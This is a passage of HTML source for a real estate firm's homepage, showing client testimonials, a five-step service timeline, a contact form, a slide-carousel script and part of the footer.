                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path>
                  </svg>
                </div>
                <p class="testimonials-column-text">
                  Working with this team was an absolute pleasure. They found us
                  our dream home in less than three weeks and negotiated a
                  fantastic deal. Their professionalism and attention to detail
                  made the entire process smooth and stress-free.
                </p>
                <div class="testimonials-column-author">
                  <div class="testimonials-column-author-name">
                    <span>Jessica Williams</span>
                  </div>
                  <div class="testimonials-column-author-title">
                    <span>Home Buyer, Beverly Hills</span>
                  </div>
                </div>
              </article>
              <article class="testimonials-column">
                <div class="testimonials-column-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="48"
                    height="48"
                    viewBox="0 0 24 24"
                  >
                    <path
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M16 3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2a1 1 0 0 1 1 1v1a2 2 0 0 1-2 2a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1a6 6 0 0 0 6-6V5a2 2 0 0 0-2-2zM5 3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2a1 1 0 0 1 1 1v1a2 2 0 0 1-2 2a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1a6 6 0 0 0 6-6V5a2 2 0 0 0-2-2z"
                    ></path>
                  </svg>
                </div>
                <div class="testimonials-column-rating">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path>
                  </svg>
                </div>
                <p class="testimonials-column-text">
                  As a housing developer, partnering with this company has been
                  transformative for our business. Their market insights and
                  sales expertise helped us sell out our latest development 40%
                  faster than projected. Exceptional service and results!
                </p>
                <div class="testimonials-column-author">
                  <div class="testimonials-column-author-name">
                    <span>Marcus Thompson</span>
                  </div>
                  <div class="testimonials-column-author-title">
                    <span>Developer, Summit Properties LLC</span>
                  </div>
                </div>
              </article>
              <article class="testimonials-column">
                <div class="testimonials-column-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="48"
                    height="48"
                    viewBox="0 0 24 24"
                  >
                    <path
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M16 3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2a1 1 0 0 1 1 1v1a2 2 0 0 1-2 2a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1a6 6 0 0 0 6-6V5a2 2 0 0 0-2-2zM5 3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2a1 1 0 0 1 1 1v1a2 2 0 0 1-2 2a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1a6 6 0 0 0 6-6V5a2 2 0 0 0-2-2z"
                    ></path>
                  </svg>
                </div>
                <div class="testimonials-column-rating">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path>
                  </svg>
                </div>
                <p class="testimonials-column-text">
                  I couldn't be happier with how quickly they sold my property!
                  Their marketing strategy brought in multiple offers within
                  days, and they negotiated above asking price. Truly
                  world-class service from start to finish.
                </p>
                <div class="testimonials-column-author">
                  <div class="testimonials-column-author-name">
                    <span>Amanda Foster</span>
                  </div>
                  <div class="testimonials-column-author-title">
                    <span>Home Seller, San Francisco</span>
                  </div>
                </div>
              </article>
            </div>
          </div>
        </section>
        <section class="timeline-vertical">
          <div class="timeline-vertical-content">
            <div class="timeline-vertical-header">
              <h2 class="section-title">Your Journey With Us</h2>
              <p class="section-subtitle">
                A transparent, step-by-step process designed for your success
              </p>
            </div>
            <div class="timeline-vertical-track">
              <div class="timeline-vertical-line"></div>
              <article class="timeline-vertical-item">
                <div class="timeline-vertical-marker">
                  <span class="timeline-vertical-number">01</span>
                </div>
                <div class="timeline-vertical-content-card">
                  <h3 class="timeline-vertical-title">Initial Consultation</h3>
                  <p class="timeline-vertical-description">
                    We begin with a comprehensive consultation to understand
                    your unique needs, goals, and timeline. Whether buying,
                    selling, or developing, we create a customized strategy
                    tailored to your objectives.
                  </p>
                  <ul class="timeline-vertical-details">
                    <li>
                      <span>One-on-one meeting with your dedicated agent</span>
                    </li>
                    <li>
                      <span>Assessment of your budget and requirements</span>
                    </li>
                    <li><span>Market analysis and opportunity review</span></li>
                  </ul>
                </div>
              </article>
              <article class="timeline-vertical-item">
                <div class="timeline-vertical-marker">
                  <span class="timeline-vertical-number">02</span>
                </div>
                <div class="timeline-vertical-content-card">
                  <h3 class="timeline-vertical-title">
                    Property Search &amp; Evaluation
                  </h3>
                  <p class="timeline-vertical-description">
                    Leveraging our extensive network and advanced search tools,
                    we identify properties that match your criteria. For
                    sellers, we conduct a thorough property evaluation to
                    determine optimal pricing and marketing strategies.
                  </p>
                  <ul class="timeline-vertical-details">
                    <li><span>Curated property recommendations</span></li>
                    <li><span>Professional property inspections</span></li>
                    <li><span>Comparative market analysis</span></li>
                  </ul>
                </div>
              </article>
              <article class="timeline-vertical-item">
                <div class="timeline-vertical-marker">
                  <span class="timeline-vertical-number">03</span>
                </div>
                <div class="timeline-vertical-content-card">
                  <h3 class="timeline-vertical-title">
                    Negotiation &amp; Offer
                  </h3>
                  <p class="timeline-vertical-description">
                    Our expert negotiators work diligently to secure the best
                    possible terms for you. We handle all communications,
                    counteroffers, and contractual details to ensure a favorable
                    outcome.
                  </p>
                  <ul class="timeline-vertical-details">
                    <li><span>Strategic offer presentation</span></li>
                    <li>
                      <span>Professional negotiation on your behalf</span>
                    </li>
                    <li><span>Contract review and due diligence</span></li>
                  </ul>
                </div>
              </article>
              <article class="timeline-vertical-item">
                <div class="timeline-vertical-marker">
                  <span class="timeline-vertical-number">04</span>
                </div>
                <div class="timeline-vertical-content-card">
                  <h3 class="timeline-vertical-title">
                    Documentation &amp; Legal Process
                  </h3>
                  <p class="timeline-vertical-description">
                    We coordinate with attorneys, inspectors, and financial
                    institutions to ensure all documentation is accurate and
                    complete. Our team manages the entire process so you can
                    focus on what matters most.
                  </p>
                  <ul class="timeline-vertical-details">
                    <li><span>Contract preparation and review</span></li>
                    <li><span>Coordination with legal professionals</span></li>
                    <li><span>Inspection and appraisal scheduling</span></li>
                  </ul>
                </div>
              </article>
              <article class="timeline-vertical-item">
                <div class="timeline-vertical-marker">
                  <span class="timeline-vertical-number">05</span>
                </div>
                <div class="timeline-vertical-content-card">
                  <h3 class="timeline-vertical-title">Closing &amp; Beyond</h3>
                  <p class="timeline-vertical-description">
                    We guide you through the final steps to closing day and
                    beyond. Our commitment to your satisfaction doesn't end at
                    closing—we're here to support you throughout your real
                    estate journey.
                  </p>
                  <ul class="timeline-vertical-details">
                    <li><span>Final walkthrough coordination</span></li>
                    <li><span>Closing day support and guidance</span></li>
                    <li><span>Post-closing assistance and resources</span></li>
                  </ul>
                </div>
              </article>
            </div>
          </div>
        </section>
        <section class="contact-split">
          <div class="contact-split-container">
            <div class="contact-split-info">
              <h2 class="section-title">Get In Touch</h2>
              <p class="section-subtitle">
                Ready to start your real estate journey? Contact us today for
                expert guidance
              </p>
              <div class="contact-split-details">
                <div class="contact-split-detail-item">
                  <div class="contact-split-detail-icon">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="32"
                      height="32"
                      viewBox="0 0 24 24"
                    >
                      <path
                        fill="none"
                        stroke="currentColor"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233a14 14 0 0 0 6.392 6.384"
                      ></path>
                    </svg>
                  </div>
                  <div class="contact-split-detail-content">
                    <div class="contact-split-detail-label">
                      <span>Phone</span>
                    </div>
                    <a href="tel:+15551234999">
                      <div class="contact-split-detail-value">
                        <span>+1 (555) 123-4999</span>
                      </div>
                    </a>
                  </div>
                </div>
                <div class="contact-split-detail-item">
                  <div class="contact-split-detail-icon">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="32"
                      height="32"
                      viewBox="0 0 24 24"
                    >
                      <g
                        fill="none"
                        stroke="currentColor"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                      >
                        <path
                          d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"
                        ></path>
                        <rect width="20" height="16" x="2" y="4" rx="2"></rect>
                      </g>
                    </svg>
                  </div>
                  <div class="contact-split-detail-content">
                    <div class="contact-split-detail-label">
                      <span>Email</span>
                    </div>
                    <a
                      href="mailto:partnerships@realtorshousingdevelopers?subject="
                    >
                      <div class="contact-split-detail-value">
                        <span>partnerships@realtorshousingdevelopers</span>
                      </div>
                    </a>
                  </div>
                </div>
                <div class="contact-split-detail-item">
                  <div class="contact-split-detail-icon">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="32"
                      height="32"
                      viewBox="0 0 24 24"
                    >
                      <g
                        fill="none"
                        stroke="currentColor"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                      >
                        <path d="M12 6v6l4 2"></path>
                        <circle cx="12" cy="12" r="10"></circle>
                      </g>
                    </svg>
                  </div>
                  <div class="contact-split-detail-content">
                    <div class="contact-split-detail-label">
                      <span>Business Hours</span>
                    </div>
                    <div class="contact-split-detail-value">
                      <span>Monday - Friday, 9 AM - 6 PM EST</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="contact-split-form-wrapper">
              <form
                action="/submit"
                method="POST"
                data-form-id="4d4c9bcf-7135-4874-8877-eec6bb3825ff"
                class="contact-split-form"
              >
                <h3 class="contact-split-form-title">Send Us a Message</h3>
                <div class="contact-split-form-row">
                  <div class="contact-split-form-group">
                    <label for="contact-name" class="contact-split-form-label">
                      Full Name
                    </label>
                    <input
                      type="text"
                      id="contact-name"
                      name="true"
                      required="true"
                      data-form-field-id="contact-name"
                      class="contact-split-form-input"
                    />
                  </div>
                  <div class="contact-split-form-group">
                    <label for="contact-email" class="contact-split-form-label">
                      Email Address
                    </label>
                    <input
                      type="email"
                      id="contact-email"
                      name="email"
                      required="true"
                      data-form-field-id="contact-email"
                      class="contact-split-form-input"
                    />
                  </div>
                </div>
                <div class="contact-split-form-row">
                  <div class="contact-split-form-group">
                    <label for="contact-phone" class="contact-split-form-label">
                      Phone Number
                    </label>
                    <input
                      type="tel"
                      id="contact-phone"
                      name="phone"
                      data-form-field-id="contact-phone"
                      class="contact-split-form-input"
                    />
                  </div>
                  <div class="contact-split-form-group">
                    <label
                      for="contact-interest"
                      class="contact-split-form-label"
                    >
                      I'm Interested In
                    </label>
                    <select
                      id="contact-interest"
                      name="interest"
                      required="true"
                      data-form-field-id="contact-interest"
                      class="contact-split-form-input"
                    >
                      <option value="true">Select an option</option>
                      <option value="buying">Buying a Property</option>
                      <option value="selling">Selling a Property</option>
                      <option value="development">Developer Partnership</option>
                      <option value="agent">Becoming an Agent</option>
                      <option value="other">Other Inquiry</option>
                    </select>
                  </div>
                </div>
                <div class="contact-split-form-group">
                  <label for="contact-message" class="contact-split-form-label">
                    Message
                  </label>
                  <textarea
                    id="contact-message"
                    name="message"
                    rows="5"
                    required="true"
                    data-form-field-id="contact-message"
                    class="contact-split-form-textarea"
                  ></textarea>
                </div>
                <button
                  type="submit"
                  id="thq_button_8l9s"
                  name="button"
                  data-form-field-id="thq_button_8l9s"
                  class="contact-split-form-submit btn btn-primary btn-lg"
                >
                  Send Message
                </button>
              </form>
            </div>
          </div>
        </section>
        <div class="home-container2">
          <div class="home-container3">
            <style>
              a.contact-split-detail-value:hover {
                color: var(--color-primary);
              }
              @media (prefers-reduced-motion: reduce) {
              .hero-carousel-bg-image, .showcase-property-image img, .gallery-grid-item-image img {
                transition: none;
                transform: none !important;
              }
              .hero-carousel-slide {
                transition: none;
              }
              .hero-carousel-control, .hero-quick-link, .showcase-property-card, .gallery-grid-item, .testimonials-column, .services-list-item, .timeline-vertical-content-card, .contact-split-detail-item {
                transition: none;
              }
              }
            </style>
          </div>
        </div>
        <div class="home-container4">
          <div class="home-container5">
            <script defer="" data-name="hero-carousel">
              document.addEventListener('DOMContentLoaded', function() {
                (function(){
                const carousel = document.querySelector('.hero-carousel-track');
                const slides = document.querySelectorAll('.hero-carousel-slide');
                const prevBtn = document.querySelector('.hero-carousel-control-prev');
                const nextBtn = document.querySelector('.hero-carousel-control-next');
                const indicators = document.querySelectorAll('.hero-carousel-indicator');

                let currentIndex = 0;
                let autoplayInterval;

                function showSlide(index) {
                  slides.forEach((slide, i) => {
                    slide.classList.toggle('hero-carousel-slide-active', i === index);
                  });
                  indicators.forEach((indicator, i) => {
                    indicator.classList.toggle('hero-carousel-indicator-active', i === index);
                  });
                }

                function nextSlide() {
                  currentIndex = (currentIndex + 1) % slides.length;
                  showSlide(currentIndex);
                }

                function prevSlide() {
                  currentIndex = (currentIndex - 1 + slides.length) % slides.length;
                  showSlide(currentIndex);
                }

                function startAutoplay() {
                  autoplayInterval = setInterval(nextSlide, 5000);
                }

                function stopAutoplay() {
                  clearInterval(autoplayInterval);
                }

                prevBtn.addEventListener('click', () => {
                  prevSlide();
                  stopAutoplay();
                  startAutoplay();
                });

                nextBtn.addEventListener('click', () => {
                  nextSlide();
                  stopAutoplay();
                  startAutoplay();
                });

                indicators.forEach((indicator, index) => {
                  indicator.addEventListener('click', () => {
                    currentIndex = index;
                    showSlide(currentIndex);
                    stopAutoplay();
                    startAutoplay();
                  });
                });

                carousel.addEventListener('mouseenter', stopAutoplay);
                carousel.addEventListener('mouseleave', startAutoplay);

                startAutoplay();
                })()
              });
            </script>
          </div>
        </div>
        <footer-wrapper class="footer-wrapper">
          <!--Footer component-->
          <div class="footer-container1">
            <footer class="footer">
              <div class="footer-main">
                <div class="footer-container">
                  <div class="footer-grid">
                    <div class="footer-brand">
                      <div class="footer-logo">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="32"
                          height="32"
                          viewBox="0 0 24 24"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path
                              d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"
                            ></path>
                            <path
                              d="M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"
                            ></path>
                          </g>
                        </svg>
                        <span class="footer-brand-name">
                          Realtors Housing Developers
                        </span>
                      </div>
                      <p class="footer-tagline">
                        Building dreams, creating communities. Your trusted
                        partner in finding the perfect home and developing
                        exceptional properties.
                      </p>
                      <div class="footer-social">
                        <a href="#">
                          <div aria-label="LinkedIn" class="footer-social-link">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="20"
                              height="20"
                              viewBox="0 0 24 24"
                            >
                              <g
                                fill="none"
                                stroke="currentColor"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                              >
                                <path
                                  d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2a2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6M2 9h4v12H2z"
                                ></path>
                                <circle cx="4" cy="4" r="2"></circle>
                              </g>
                            </svg>
                          </div>
                        </a>
                        <a href="#">
                          <div aria-label="Facebook" class="footer-social-link">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="20"
                              height="20"
                              viewBox="0 0 24 24"
                            >
                              <path
                                fill="none"
                                stroke="currentColor"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"
                              ></path>
                            </svg>
                          </div>
                        </a>
                        <a href="#">
                          <div aria-label="Twitter" class="footer-social-link">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="20"
                              height="20"
                              viewBox="0 0 24 24"
                            >
                              <path
                                fill="none"
                                stroke="currentColor"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6c2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4c-.9-4.2 4-6.6 7-3.8c1.1 0 3-1.2 3-1.2"
                              ></path>
                            </svg>
                          </div>
                        </a>
                        <a href="#">
                          <div
                            aria-label="Instagram"
                            class="footer-social-link"
                          >
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="20"
                              height="20"
                              viewBox="0 0 24 24"
                            >
                              <g
                                fill="none"
                                stroke="currentColor"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                              >
                                <rect
                                  width="20"
                                  height="20"
                                  x="2"
                                  y="2"
                                  rx="5"
                                  ry="5"
                                ></rect>
                                <path
                                  d="M16 11.37A4 4 0 1 1 12.63 8A4 4 0 0 1 16 11.37m1.5-4.87h.01"
                                ></path>
                              </g>
                            </svg>
                          </div>
                        </a>
                      </div>
                    </div>
                    <div class="footer-links-group">
                      <h3 class="footer-column-title">Company</h3>
                      <ul class="footer-links">
                        <li>
                          <a href="index.html">
                            <div class="footer-link"><span>Homepage</span></div>
                          </a>
                        </li>
                        <li>
                          <a href="services.html">
                            <div class="footer-link"><span>Services</span></div>
                          </a>
                        </li>
                        <li>
                          <a href="housing-developers.html">
                            <div class="footer-link">
                              <span>Housing Developers</span>
                            </div>
                          </a>
                        </li>
                        <li>
                          <a href="contact.html">
                            <div class="footer-link">
                              <span>Contact Us</span>
                            </div>
                          </a>
                        </li>
                      </ul>
                    </div>
                    <div class="footer-links-group">
                      <h3 class="footer-column-title">Legal</h3>
                      <ul class="footer-links">
                        <li>
                          <a href="privacy-policy.html">
                            <div class="footer-link">
                              <span>Privacy Policy</span>
                            </div>
                          </a>
                        </li>
                        <li>
                          <a href="terms.html">
                            <div class="footer-link">
                              <span>Terms of Service</span>
                            </div>
                          </a>
                        </li>
                        <li>
                          <a href="cookie-policy.html">
                            <div class="footer-link">
                              <span>Cookie Policy</span>
                            </div>
                          </a>
                        </li>
                      </ul>
                    </div>
                    <div class="footer-contact">
                      <h3 class="footer-column-title">Contact Information</h3>
                      <div class="footer-contact-items">
                        <div class="footer-contact-item">
                          <div class="footer-contact-icon">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="20"
                              height="20"
                              viewBox="0 0 24 24"
                            >
                              <path
                                fill="none"
                                stroke="currentColor"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233a14 14 0 0 0 6.392 6.384"
                              ></path>
                            </svg>
                          </div>
                          <a href="tel:+15551234999">
                            <div class="footer-contact-link">
                              <span>+1 (555) 123-4999</span>
                            </div>
                          </a>
                        </div>
                        <div class="footer-contact-item">
                          <div class="footer-contact-icon">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="20"
                              height="20"
                              viewBox="0 0 24 24"
                            >
                              <g
                                fill="none"
                                stroke="currentColor"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                              >
                                <circle cx="6" cy="12" r="4"></circle>
                                <circle cx="18" cy="12" r="4"></circle>
                                <path d="M6 16h12"></path>
                              </g>
                            </svg>
                          </div>
                          <a
                            href="mailto:partnerships@realtorshousingdevelopers?subject="
                          >
                            <div class="footer-contact-link">
                              <span>
                                partnerships@realtorshousingdevelopers
                              </span>
                            </div>
                          </a>
                        </div>
                        <div class="footer-contact-item">
                          <div class="footer-contact-icon">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="20"
